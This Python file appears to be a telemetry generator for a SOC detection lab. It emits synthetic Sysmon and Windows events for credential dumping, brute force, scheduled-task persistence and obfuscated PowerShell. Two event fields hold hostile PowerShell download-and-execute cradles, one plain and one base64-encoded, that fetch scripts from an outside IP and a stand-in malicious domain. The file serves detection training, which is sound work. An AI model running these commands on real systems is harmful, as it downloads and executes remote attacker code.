"""
Attack Simulator Engine for SOC SIEM/SOAR Lab
Simulates adversary tactics mapped to MITRE ATT&CK framework and generates realistic event telemetry.
"""

import json
import random
import time
from datetime import datetime, timezone

def generate_timestamp():
    return datetime.now(timezone.utc).isoformat()

def simulate_t1003_lsass_dump():
    """MITRE ATT&CK T1003.001: Credential Dumping via LSASS Read Access"""
    tool = random.choice(["mimikatz.exe", "procdump.exe", "lsass_dumper.ps1", "comsvcs.dll"])
    attacker_ip = random.choice(["192.168.1.105", "10.0.0.45", "185.220.101.33"])
    target_user = "CORP\\Administrator"
    
    event = {
        "event_id": 10, # Sysmon ProcessAccess
        "event_source": "Microsoft-Windows-Sysmon",
        "provider": "Sysmon",
        "timestamp": generate_timestamp(),
        "technique_id": "T1003.001",
        "technique_name": "OS Credential Dumping: LSASS Memory",
        "tactic": "Credential Access",
        "computer_name": "WIN-DC01.corp.local",
        "user": target_user,
        "source_ip": attacker_ip,
        "details": {
            "SourceImage": f"C:\\Windows\\Temp\\{tool}",
            "TargetImage": "C:\\Windows\\System32\\lsass.exe",
            "GrantedAccess": "0x1010",
            "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9a100|C:\\Windows\\System32\\KERNELBASE.dll+2c410",
            "SourceProcessId": random.randint(2000, 9000),
            "TargetProcessId": 672,
            "FileHash_SHA256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        },
        "severity": "CRITICAL"
    }
    return event

def simulate_t1110_brute_force():
    """MITRE ATT&CK T1110.001: Password Brute Force Attack"""
    attacker_ip = random.choice(["185.220.101.5", "45.142.214.12", "193.142.146.210"])
    target_user = random.choice(["admin", "administrator", "root", "j.smith", "service_acct"])
    
    event = {
        "event_id": 4625, # Windows Security Failed Logon
        "event_source": "Microsoft-Windows-Security-Auditing",
        "provider": "Security",
        "timestamp": generate_timestamp(),
        "technique_id": "T1110.001",
        "technique_name": "Brute Force: Password Guessing",
        "tactic": "Credential Access",
        "computer_name": "CORP-RDP-GW01",
        "user": target_user,
        "source_ip": attacker_ip,
        "details": {
            "LogonType": 10, # Remote Desktop (RDP)
            "SubStatus": "0xc000006a", # User logon with misspelled or bad password
            "WorkstationName": "ATTACKER-PC",
            "ProcessName": "C:\\Windows\\System32\\svchost.exe",
            "FailedAttemptsCount": random.randint(15, 80)
        },
        "severity": "HIGH"
    }
    return event

def simulate_t1053_scheduled_task():
    """MITRE ATT&CK T1053.005: Persistence via Scheduled Task"""
    task_name = random.choice(["SystemHealthUpdate", "GoogleUpdateTaskMachine", "WindowsDefendSync"])
    payload = "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.5/beacon.ps1')\""
    
    event = {
        "event_id": 4698, # Scheduled Task Created
        "event_source": "Microsoft-Windows-Security-Auditing",
        "provider": "Security",
        "timestamp": generate_timestamp(),
        "technique_id": "T1053.005",
        "technique_name": "Scheduled Task/Job: Scheduled Task",
        "tactic": "Persistence",
        "computer_name": "WIN-WORKSTATION09",
        "user": "CORP\\j.doe",
        "source_ip": "10.0.2.15",
        "details": {
            "TaskName": f"\\{task_name}",
            "TaskContent": payload,
            "SubjectUserName": "j.doe",
            "SubjectDomainName": "CORP",
            "ClientIP": "10.0.2.15"
        },
        "severity": "HIGH"
    }
    return event

def simulate_t1059_powershell_execution():
    """MITRE ATT&CK T1059.001: Obfuscated PowerShell Command Execution"""
    encoded_cmd = "aW52b2tlLWV4cHJlc3Npb24gKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9tYWxpY2lvdXMtZG9tYWluLmNvbS9zaGVsbC5wczEnKQ=="
    
    event = {
        "event_id": 1, # Sysmon Process Creation
        "event_source": "Microsoft-Windows-Sysmon",
        "provider": "Sysmon",
        "timestamp": generate_timestamp(),
        "technique_id": "T1059.001",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "tactic": "Execution",
        "computer_name": "CORP-FINANCE-02",
        "user": "CORP\\m.worker",
        "source_ip": "10.0.4.88",
        "details": {
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded_cmd}",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            "ParentCommandLine": "cmd.exe /c start_update.bat",
            "Hashes": "SHA256=F058F9A5D60E36E4E2C79E89DCE9A32158814F23D6980D4181F54B00D499E0C1"
        },
        "severity": "HIGH"
    }
    return event

def generate_random_attack():
    attack_funcs = [
        simulate_t1003_lsass_dump,
        simulate_t1110_brute_force,
        simulate_t1053_scheduled_task,
        simulate_t1059_powershell_execution
    ]
    selected = random.choice(attack_funcs)
    return selected()

if __name__ == "__main__":
    print("[*] Generating Sample Attack Telemetry Event...")
    sample_event = generate_random_attack()
    print(json.dumps(sample_event, indent=2))
